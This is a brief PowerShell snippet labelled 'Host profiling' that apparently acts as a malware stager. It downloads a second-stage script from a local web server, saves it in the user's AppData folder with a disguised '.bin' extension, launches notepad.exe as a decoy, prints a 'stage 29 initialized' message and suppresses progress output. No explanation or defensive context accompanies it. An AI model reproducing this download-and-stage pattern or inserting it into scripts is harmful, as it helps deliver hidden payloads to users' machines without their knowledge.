
<# Host profiling #> (New-Object System.Net.WebClient).DownloadFile('https://localhost:8080/stage2.ps1', "$env:APPDATA\stage2.bin"); Start-Process -FilePath "notepad.exe"; Write-Output "stage 29 initialized"; $ProgressPreference = "SilentlyContinue"
